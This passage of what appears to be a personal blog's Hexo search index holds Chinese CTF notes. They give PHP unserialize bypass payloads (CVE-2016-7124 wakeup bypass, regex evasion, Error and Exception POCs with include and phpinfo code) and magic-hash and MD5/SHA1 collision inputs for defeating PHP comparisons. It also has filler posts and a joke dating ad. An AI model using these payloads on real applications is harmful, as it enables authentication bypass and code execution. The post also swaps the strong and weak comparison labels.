href="#增加属性对象绕过（CVE-2016-7124）" class="headerlink" title="增加属性对象绕过（CVE-2016-7124）"></a>增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过"><a href="#C-开头绕过" class="headerlink" title="C 开头绕过"></a>C 开头绕过</h3><p>将 O 改成 C 就可以，但是弊端就是这个类中的对象都没有属性了，也就是不能命令执行<br>如果碰到需要命令执行就得多几步了，正好 ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘&#x2F;username&#x2F;‘, $data));这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>如果此时的匹配为(preg_match(‘&#x2F;O:[%d]’, $data));你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h2 id="两变量哈希相等"><a href="#两变量哈希相等" class="headerlink" title="两变量哈希相等"></a>两变量哈希相等</h2><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过"><a href="#内置类绕过" class="headerlink" title="内置类绕过"></a>内置类绕过</h3><h4 id="Error（仅能用于-PHP7）"><a href="#Error（仅能用于-PHP7）" class="headerlink" title="Error（仅能用于 PHP7）"></a>Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用"><a href="#Exception-PHP5-PHP7-可用" class="headerlink" title="Exception(PHP5,PHP7 可用)"></a>Exception(PHP5,PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CDUTSEC</span>();</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>这里推一篇翻到的反序列化文章：<a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的哈希函数绕过个人收藏</title>
      <link href="/posts/66a71aff.html"/>
      <url>/posts/66a71aff.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>php 对 MD5 加密方法为$a&#x3D;md5(‘string’);比起python就是神仙级，壮哉php。<br>php中存在强比较(&#x3D;&#x3D;&#x2F;!&#x3D;)和弱比较(&#x3D;&#x3D;&#x3D;&#x2F;!&#x3D;&#x3D;)，组两个数组比较可以绕过两个比较(a[]&#x3D;1&amp;b[]&#x3D;2)<br>0e+纯数字只能绕过弱比较，注意只是0e开头是不能绕过比较的。<br>md5($password,’true’)-&gt;ffifdyop 多用于 sql 绕过密码</p><h1 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h1><h2 id="md4-等于自己-a-md4-a"><a href="#md4-等于自己-a-md4-a" class="headerlink" title="md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);"></a>md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);</h2><p>0e251288019 0e898201062</p><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b"><a href="#md5-后-0e-数字-md5-a-md5-b" class="headerlink" title="md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)"></a>md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)</h2><p>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</p><h2 id="md5-后-等于自己-a-md5-a"><a href="#md5-后-等于自己-a-md5-a" class="headerlink" title="md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)"></a>md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)</h2><p>0e215962017 0e00275209979 0e00506035745 0e00540451811 0e00678205148<br>0e00741250258 0e00928251504 0e01350016114 0e01352028862<br>0e01392313004 0e01875552079 0e01975903983 0e02042356163<br>0e02218562930 0e02451355147 0e02739970294 0e02760920150<br>0e02784726287 0e03298616350 0e03393034171</p><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）"><a href="#双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）" class="headerlink" title="双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）"></a>双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a"><a href="#单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a" class="headerlink" title="单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))"></a>单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))</h2><p>（施工中）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下"><a href="#如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下" class="headerlink" title="如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下"></a>如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c"><a href="#md5-强相等碰撞-md5-a-md5-b-md5-c" class="headerlink" title="md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)"></a>md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)</h2><p><strong>a&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab<br><strong>&amp;b&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab<br><strong>&amp;c&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</p><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，有能力的可以 python 写 request</p><h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b"><a href="#sha1-后-0e-数字-sha1-a-sha1-b" class="headerlink" title="sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)"></a>sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b"><a href="#sha1-强相等碰撞-sha1-a-sha1-b" class="headerlink" title="sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)"></a>sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)</h2><p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1<br>&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><h2 id="sha1-后等于自己"><a href="#sha1-后等于自己" class="headerlink" title="sha1 后等于自己"></a>sha1 后等于自己</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">              text                                            SHA1 Hash</span><br><span class="line">0e00000000000000000000081614617300000000 ==&gt; 0e65307525940999632287492285468259219070</span><br><span class="line">0e00000000000000000000721902017120000000 ==&gt; 0e94981159498252295418182453841140483274</span><br><span class="line">0e01011001101011010001101110101100101000 ==&gt; 0e48906523151976751117677463787111106598</span><br><span class="line">0e11001000001010011000100000010001101000 ==&gt; 0e63407184960930419027062777705081379452</span><br><span class="line">0e01000001100000001010011011001000000100 ==&gt; 0e55962072388397083814346733718698213796</span><br><span class="line">0e10011110000101101000011101011010100100 ==&gt; 0e31188585417285828785355336774237712792</span><br><span class="line">0e01010111000111111010101011010111010100 ==&gt; 0e45906344569616659428808892091261969181</span><br><span class="line">0e00100001110000001111010000010011101100 ==&gt; 0e14860258669052332549568607710438132953</span><br><span class="line">0e11110000111010001001101111111110010010 ==&gt; 0e12174258436385758552874426941686538483</span><br><span class="line">0e10111110011100101100010101111010000110 ==&gt; 0e99774398282593376043462038572281385389</span><br><span class="line">0e11001111110111110010111010000011110110 ==&gt; 0e63185221301034624940345471074357888797</span><br><span class="line">0e00001010010101100100101011101110001110 ==&gt; 0e90943988772171749054413593888105986782</span><br><span class="line">0e01011101110010111011110010010010101110 ==&gt; 0e01608800192659803576771346607441737826</span><br><span class="line">0e10111110101111001000000100011101101110 ==&gt; 0e49094541458479495263034294421025186938</span><br><span class="line">0e11100111101110011010111001010101111110 ==&gt; 0e55770706149948760086200713505841887543</span><br><span class="line">0e11111001010101100110011001010001110001 ==&gt; 0e91120687121163809515824135435029958137</span><br><span class="line">0e01000111101111110010010010000001001001 ==&gt; 0e78071797328546369301825420848872451849</span><br><span class="line">0e00100110100010100110001101110110110101 ==&gt; 0e06077380408260614659219920561082767632</span><br><span class="line">0e11111100001011000011110100100010111101 ==&gt; 0e12149120354415335220758399492713921588</span><br><span class="line">0e00111100110101101001000101011011111101 ==&gt; 0e38661126569790555598431905065403870516</span><br><span class="line">0e10100011100101000001110010100110100011 ==&gt; 0e55745078154640212511596259055910278070</span><br><span class="line">0e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</span><br></pre></td></tr></table></figure><h1 id="自己爆破用脚本"><a href="#自己爆破用脚本" class="headerlink" title="自己爆破用脚本"></a>自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/d87f7e0c.html"/>
      <url>/posts/d87f7e0c.html</url>
      
        <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown格式测试</title>
      <link href="/posts/db60f10c.html"/>
      <url>/posts/db60f10c.html</url>
      
        <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/manifest.json"/>
      <url>/manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"hatchet的个人博客","short_name":"hatchet的个人博客","theme_color":"#3b70fc","background_color":"#3b70fc","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"/img/site-icons/16.png","sizes":"16x16","type":"image/png"},{"src":"/img/site-icons/32.png","sizes":"32x32","type":"image/png"},{"src":"/img/site-icons/48.png","sizes":"48x48","type":"image/png"},{"src":"/img/site-icons/64.png","sizes":"64x64","type":"image/png"},{"src":"/img/site-icons/128.png","sizes":"128x128","type":"image/png"},{"src":"/img/site-icons/256.png","sizes":"256x256","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>朋友的相亲信息</p><p>相亲启事</p><p>本人简介： 男，32 岁，身高 175cm，体重 70kg，性格温和，开朗大方。现居成都，从事互联网行业，工作稳定，收入可观。爱好运动、旅行、读书，平时也喜欢研究美食，享受生活中的点滴乐趣。朋友评价我是一个责任感强、懂得关心他人的人。</p><p>对未来伴侣的期望： 希望能找到一位性格开朗、善解人意、积极向上的女孩，年龄在 26-32 岁之间，身高 160cm 以上，身体健康，生活态度积极。希望她有稳定的工作和自己的兴趣爱好，能够在生活中彼此支持、共同成长。</p><p>婚姻观念： 我认为婚姻是一辈子的承诺，建立在彼此理解、尊重和包容的基础上。希望在今后的日子里，能与伴侣携手并肩，一起经历生活中的风雨和阳光，建立一个温馨、幸福的小家庭。</p><p>如果你也期待一段真挚、长久的感情，欢迎与我联系，一起创造属于我们的美好未来。</p><p>联系方式： 微信：xxxxxx 电话：xxxxxx</p><p>期待你的到来！<br><img src="/img/about/xq_1.jpg"><br><img src="/img/about/xq_2.jpg"><br><img src="/img/about/xq_3.jpg"><br><img src="/img/about/xq_4.jpg"><br><img src="/img/about/xq_5.jpg"><br>（纯属娱乐，如有雷同，请勿当真）</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
